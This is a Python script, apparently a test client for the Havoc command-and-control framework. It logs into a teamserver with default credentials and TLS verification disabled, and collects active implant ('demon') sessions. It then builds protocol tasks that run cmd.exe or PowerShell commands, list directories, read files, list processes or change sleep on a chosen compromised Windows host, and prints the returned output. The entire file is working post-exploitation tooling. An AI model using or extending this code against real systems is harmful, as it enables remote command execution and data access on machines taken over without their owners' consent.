#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Phase 0 验证：登录 -> 选一个会话 -> 发送命令 -> 打印回包。

用法:
    python3 testsend.py --command "shell whoami" [--demon 6fb41d56]
"""
import argparse
import asyncio
import base64
import hashlib
import json
import random
import ssl

import websockets


def sha3_hex(text: str) -> str:
    return hashlib.sha3_256(text.encode()).hexdigest()


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def build_info(demon: str, task_id: str, command_line: str):
    """按 client/src/Havoc/CommandSend.cc 构造。"""
    parts = command_line.split(" ")
    cmd = parts[0].lower()
    rest = command_line[len(parts[0]):].lstrip()
    info = {
        "TaskID": task_id,
        "CommandLine": command_line,
        "DemonID": demon,
        "AgentType": "Demon",
    }
    if cmd == "shell":
        info.update({
            "CommandID": "4112",
            "ProcCommand": "4",
            "Args": "0;FALSE;TRUE;c:\\windows\\system32\\cmd.exe;" + b64("/c " + rest),
        })
    elif cmd == "powershell":
        info.update({
            "CommandID": "4112",
            "ProcCommand": "4",
            "Args": "0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;" + b64("-C " + rest),
        })
    elif cmd in ("pwd",):
        info.update({"CommandID": "15", "SubCommand": "pwd", "Arguments": ""})
    elif cmd in ("dir", "ls"):
        path = rest or "."
        info.update({"CommandID": "15", "SubCommand": "dir",
                     "Arguments": f"{path};false;false;false;false;;;"})
    elif cmd == "cd":
        info.update({"CommandID": "15", "SubCommand": "cd", "Arguments": rest})
    elif cmd in ("cat", "type"):
        info.update({"CommandID": "15", "SubCommand": "cat", "Arguments": b64(rest)})
    elif cmd == "ps":
        info.update({"CommandID": "12", "FromProcessManager": "false"})
    elif cmd == "sleep":
        vals = rest.split()
        info.update({"CommandID": "11", "Arguments": f"{vals[0]};{vals[1] if len(vals) > 1 else 0}"})
    elif cmd == "checkin":
        info.update({"CommandID": "100"})
    else:
        raise SystemExit(f"unsupported: {cmd}")
    return info


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=40056)
    ap.add_argument("--user", default="Neo")
    ap.add_argument("--password", default="password1234")
    ap.add_argument("--command", default="shell whoami")
    ap.add_argument("--demon", default=None)
    ap.add_argument("--seconds", type=float, default=12)
    args = ap.parse_args()

    url = f"wss://{args.host}:{args.port}/havoc/"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sessions = {}
    async with websockets.connect(url, ssl=ctx, max_size=None, ping_interval=None) as ws:
        await ws.send(json.dumps({
            "Head": {"Event": 1, "User": args.user, "Time": ""},
            "Body": {"SubEvent": 3, "Info": {"User": args.user, "Password": sha3_hex(args.password)}},
        }, separators=(",", ":")).encode())

        async def recv_for(seconds):
            end = asyncio.get_event_loop().time() + seconds
            while True:
                left = end - asyncio.get_event_loop().time()
                if left <= 0:
                    return None
                try:
                    return await asyncio.wait_for(ws.recv(), timeout=left)
                except asyncio.TimeoutError:
                    return None

        # 收集会话
        while True:
            raw = await recv_for(5)
            if raw is None:
                break
            pkg = json.loads(raw)
            h, b = pkg["Head"], pkg["Body"]
            if h["Event"] == 7 and b["SubEvent"] == 1:
                sid = b["Info"]["NameID"]
                sessions[sid] = b["Info"]
                if len(sessions) >= 8:
                    break
            if h["Event"] == 1 and b["SubEvent"] in (1, 2):
                print("login:", b["Info"])

        print(f"sessions: {len(sessions)} -> {sorted(sessions)}")
        if not sessions:
            return 1
        demon = args.demon or sorted(sessions)[0]
        if demon not in sessions:
            raise SystemExit(f"demon {demon} not found")
        task_id = f"{random.getrandbits(32):08X}"
        info = build_info(demon, task_id, args.command)
        print(f"send task {task_id} -> {demon}: {info}")
        await ws.send(json.dumps({
            "Head": {"Event": 7, "User": args.user, "Time": ""},
            "Body": {"SubEvent": 3, "Info": info},
        }, separators=(",", ":")).encode())

        end = asyncio.get_event_loop().time() + args.seconds
        while asyncio.get_event_loop().time() < end:
            raw = await recv_for(end - asyncio.get_event_loop().time())
            if raw is None:
                break
            pkg = json.loads(raw)
            h, b = pkg["Head"], pkg["Body"]
            if h["Event"] != 7 or b["SubEvent"] != 4:
                continue
            out = b["Info"]
            if out.get("DemonID") != demon and out.get("TaskID") != task_id:
                continue
            print(f"\n[recv] CommandID={out.get('CommandID')} TaskID={out.get('TaskID')}")
            raw_out = out.get("Output", "")
            try:
                decoded = base64.b64decode(raw_out)
            except Exception:
                decoded = b""
            if out.get("CommandID") == "128":
                try:
                    print(json.dumps(json.loads(decoded), ensure_ascii=False))
                except Exception:
                    print(repr(decoded[:500]))
            else:
                print(repr(decoded[:1500]))
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
